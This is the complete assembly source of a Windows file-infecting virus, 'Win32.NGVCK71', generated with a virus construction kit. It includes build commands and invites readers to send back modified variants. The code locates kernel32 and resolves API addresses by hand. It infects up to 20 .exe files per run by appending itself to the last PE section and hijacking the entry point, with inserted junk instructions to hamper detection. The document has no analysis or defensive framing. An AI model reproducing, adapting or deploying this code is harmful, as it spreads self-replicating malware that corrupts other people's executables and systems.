              
;
;
; Win32.NGVCK71 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK71
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 47
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
                                        ; add esp, 4
 add esp, 4d
 mov edx, dword ptr [esp-4]
                                        ; mov ebp, edx
 push edx
 pop ebp
 jmp KernelSearchStart


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 mov edx, ebp
 add edx, offset WFD_nFileSizeLow

 cmp dword ptr [edx], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; mov eax, -1
 mov eax, ( -1d xor 1d )
 xor eax, 1d
 and eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
                                        ; mov ebx, 34272
 mov ebx, ( 34272d xor 34d )
 xor ebx, 34d
 cmp ebx, 34272d
 je Notagoodfile

Goodfile:
                                        ; clear ebx
 mov ebx, 0
 mov bx, word ptr [eax+3Ch]
 or ebx, ebx
 jz Notagoodfile
 push dword ptr [eax+3Ch]
 pop edi
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edi
 jb Notagoodfile
 add edi, eax
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edi], 'EP'
 je Goodfile2
                                        ; clear ecx
 push 0
 pop ecx
 test ecx, ecx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edi+4Ch], 'NGVC'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; mov eax, -1
 push -1d
 pop eax
 and eax, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edx, [eax+3Ch]
 add edx, eax
                                        ; get File Alignment
 mov eax, [edx+3Ch]
                                        ; mov ebx, -1
 mov ebx, 0
 add ebx, -1d
 and ebx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 push eax
 pop dword ptr [ebp+AlignReg2]
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 sbb edx, 3d                            ; Trash
 add dword ptr [ebp+AlignReg1], ebx
 shr ecx, 26d                           ; Trash
 call Align
                                        ; mov ebx, -1
 mov ebx, ( -1d - 31d )
 add ebx, 31d
 and ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], -1
 and dword ptr [ebp+NewSize], ebx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], -1
 and dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; retrieve PE - Header again
 mov edx, esi
 add edx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 mov esi, edx
                                        ; get last section
 movzx eax, word ptr [esi+06h]
 add eax, -1
 imul eax, eax, 28h
                                        ; add edx, 120
 add edx, 120d
 add edx, eax
                                        ; clear ebx
 mov ebx, -55871d
 add ebx, 55871d
 add ebx, dword ptr [esi+74h]
 shl ebx, 3
 add edx, ebx
                                        ; get old Entrypoint
 mov ebx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 add dword ptr [ebp+OldBase], ebx
 mov ebx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], 0
 xor dword ptr [ebp+OldEIP], ebx
 mov ebx, [edx+10h]
                                        ; mov eax, ebx
 push ebx
 pop eax
 add ebx, [edx+14h]
 push ebx
 mov ecx, eax
 sub dword ptr [ebp+Trash1], 1700633    ; Trash
 add edx, 0Ch
 add ecx, [edx]
 sub edx, 0Ch
 push ecx
 pop dword ptr [ebp+NewEIP]
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], ecx
 mov ecx, [edx+10h]
 push ecx
                                        ; calculate new section size
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], ecx
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
 mov dword ptr [edx+10h], ecx
 pop ecx
 add ecx, VirusSize
 mov dword ptr [edx+08h], 0
 add dword ptr [edx+08h], ecx
 adc dword ptr [ebp+Trash1], 468642     ; Trash
 mov ecx, dword ptr [edx+0Ch]
 add ecx, dword ptr [edx+10h]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], ecx
                                        ; set write, read and code flag
 or dword ptr [edx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 mov edx, VirusSize
 lea ebx, [ebp+Virus]
 xchg ebx, esi

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; mov ebx, -1
 mov ebx, ( -1d + 5d )
 sub ebx, 5d
 and ebx, dword ptr [ebp+InfCounter]
 dec ebx
 mov dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 stc
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea ecx, [ebp+filemask]
 xchg edi, ecx

                                        ; Set Infection Counter
                                        ; mov ecx, 20
 mov ecx, ( 20d - 36d )
 add ecx, 36d
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], ecx
                                        ; Find File to infect
 call FindFirstFileProc
 mov dword ptr [ebp+Trash1], ebx        ; Trash
                                        ; add eax, 1
 add eax, 1d
                                        ; add eax, 1
 inc eax
 dec eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
                                        ; clear edx
 mov edx, 0
 add edx, dword ptr [ebp+InfCounter]
 cmp edx, 0
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov esi, dword ptr [ebp+FindHandle]
 push esi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 and edx, 0
 mov eax, dword ptr [ebp+AlignReg1]
 push eax
 div ebx
 sub ebx, edx
 pop eax
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov ebx, dword ptr [esp]
                                        ; round to pages
 shr ebx, 16d
 rol ebx, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 6510
 sub dword ptr [ebp+K32Trys], 510d
                                        ; store old EIP and ImageBase
                                        ; clear eax
 mov eax, 28869d
 sub eax, 28869d
 xor eax, dword ptr [ebp+OldEIP]

 push eax
 pop dword ptr [ebp+retEIP]

                                        ; clear eax
 sub eax, eax
 add eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], eax



GK1:                                    ; check for DOS-EXE Stub
 cmp dword ptr [ebp+K32Trys], 0h
 jz NoKernel
                                        ; check for ZM
 cmp word ptr [ebx], 'ZM'
 je CheckPE

GK2:
 add ebx, -65536d
 dec dword ptr [ebp+K32Trys]
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add ebx, 60
 add ebx, 60d
 mov edi, [ebx]
 add ebx, -60d
 neg ebx
 sub edi, ebx
 sub dword ptr [ebp+Trash1], 132424     ; Trash
 neg ebx
                                        ; check for EP
 cmp word ptr [edi], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:

KernelFound:
 push ebx
 pop dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+KernelPE], 0
 add dword ptr [ebp+KernelPE], edi

 lea eax, GetApis
 add eax, ebp

 push eax
ret


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Lenght of API-Name
                                        ; esi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



 mov eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear edi
 mov edi, 0
 add edi, [eax+78h]
 add edi, [ebp+KernelMZ]
                                        ; add edi, 28
 add edi, 28d
                                        ; get ATableVA
 mov eax, dword ptr [edi]
 add eax, [ebp+KernelMZ]
                                        ; add edi, 4
 dec edi
 add edi, 5d
 mov dword ptr [ebp+ATableVA], eax
                                        ; get NTableVA
 mov eax, dword ptr [edi]
                                        ; add edi, 4
 add edi, 4d
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; get OTableVA
 mov eax, dword ptr [edi]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
 mov ecx, dword ptr [ebp+NTableVA]
                                        ; clear the counter
 and word ptr [ebp+counter], 0h


SearchNextApi1:                         ; search for the API's
 push ecx
 ror eax, 9d                            ; Trash
 mov edx, dword ptr [ecx]
 add edx, [ebp+KernelMZ]
                                        ; mov ecx, edx
                                        ; clear ecx
 mov ecx, 0
 add ecx, edx
                                        ; mov edi, ecx
                                        ; clear edi
 sub edi, edi
 add edi, ecx
 mov dword ptr [ebp+TempApisearch1], ebx
 push edi
 push esi
 pop dword ptr [ebp+TempApisearch3]
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov dh, byte ptr [edi]
 cmp dh, byte ptr [esi]
 jne ApiNotFound
 dec ebx
 or ebx, ebx
 jz FoundApi1
                                        ; add esi, 1
 sub esi, -1d
                                        ; add edi, 1
 inc edi
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop ecx
                                        ; mov esi, -1
 mov esi, -1d
 and esi, dword ptr [ebp+TempApisearch3]
 push dword ptr [ebp+TempApisearch1]
 pop ebx
                                        ; add ecx, 4
 add ecx, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 8d
 inc edx                                ; Trash
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 push eax
 pop edx
 movzx eax, word ptr [edx]
 shl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [eax]
 add edx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], -1
 and dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea edi, [ebp+WFD_szFileName]

                                        ; mov edx, 276
 push 276d
 pop edx

ClearOldData2:
 mov byte ptr [edi], 0h
                                        ; add edi, 1
 sub edi, -1d
 dec edx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]
 xchg esi, edi

 push edi
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea eax, [ebp+WIN32_FIND_DATA]

 push eax
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 xor dword ptr [ebp+FindHandle], eax
ret





;                  [ ///// * Data * \\\\\ ]

Data:
 counter     dw 0h
 db 'Win32.NGVCK71 - SnakeByte',0
 TempApisearch3 dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)


 APIOffsets:
 XCreateFileMappingA    dd 0h
 XFindClose             dd 0h
 XMapViewOfFile         dd 0h
 XCloseHandle           dd 0h
 XCreateFileA           dd 0h
 XFindNextFileA         dd 0h
 XUnmapViewOfFile       dd 0h
 XFindFirstFileA        dd 0h

 NewEIP      dd 0h
 MapAddress  dd 0h
 FindHandle  dd 0h
 OTableVA    dd 0h
 AlignReg2   dd 0h
 TempApisearch1 dd 0h
 TempAPI     dd 0h
 KernelMZ    dd 0h
 NewSize     dd 0h
 NTableVA    dd 0h
 FileHandle  dd 0h
 AlignReg1   dd 0h
 KernelPE    dd 0h
 MapHandle   dd 0h
 OldBase     dd 400000h
 OldEIP      dd 0h
 ATableVA    dd 0h
 K32Trys     dd 0h

 APINames:
 db 18d, 'CreateFileMappingA'
 db 09d, 'FindClose'
 db 13d, 'MapViewOfFile'
 db 11d, 'CloseHandle'
 db 11d, 'CreateFileA'
 db 13d, 'FindNextFileA'
 db 15d, 'UnmapViewOfFile'
 db 14d, 'FindFirstFileA'

 filemask    db '*.exe',0
 InfCounter  dd 0h
 Trash1      dd 0h




;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ebx, 80000000h or 40000000h
 push ebx
 neg eax                                ; Trash
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, ebx

 push ebx
 call dword ptr [ebp+XCreateFileA]

 cmp eax, -1
 je Closed

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear ebx
 and ebx, 0
 add ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx

                                        ; clear ecx
 mov ecx, 10973d
 sub ecx, 10973d
 push ecx
 push ebx
 push ecx
                                        ; mov edx, 4
 mov edx, ( 4d xor 23d )
 xor edx, 23d
 push edx
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz CloseFile
                                        ; clear eax
 mov eax, 0
 push ebx
 push eax
 push eax
                                        ; mov edx, 2
 push 2d
 pop edx
 push edx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 sub eax, 1
 add eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear ecx
 mov ecx, -33160d
 add ecx, 33160d
 add ecx, dword ptr [ebp+OldBase]

 push ecx
 pop dword ptr [ebp+retBase]

                                        ; clear ebx
 sub ebx, ebx
 xor ebx, dword ptr [ebp+OldEIP]

 push ebx
 pop dword ptr [ebp+retEIP]



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 or ebp, ebp
 jz FirstGenHost
 mov ecx,12345678h
 org $-4
 retBase dd 0h
 add ecx,12345678h
 org $-4
 retEIP dd 0h
 push ecx
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear eax
 xor eax, eax
 add eax, NumberOfApis

                                        ; load API Names and Offsets
 lea esi, [ebp+APINames]

 lea ebx, [ebp+APIOffsets]
 xchg ebx, ecx


GetApisLoop: 

                                        ; clear ebx
 sub ebx, ebx
 mov bl, byte ptr [esi]
                                        ; add esi, 1
 inc esi

                                        ; search 'em
                                        ; ebx contains Name-Lenght
                                        ; esi points to the Name
                                        ; ecx points to the offset

 call SearchAPI1
 push esi
 add dword ptr [esp], ebx
 pop esi
                                        ; clear edx
 mov edx, 6176d
 sub edx, 6176d
 xor edx, dword ptr [ebp+TempAPI]
 mov dword ptr [ecx], -1
 and dword ptr [ecx], edx
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
 sub eax, 1
 jnz GetApisLoop
 jmp Outbreak



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ebx
 sub ebx, ebx
 push ebx
 call ExitProcess



end FakeCode

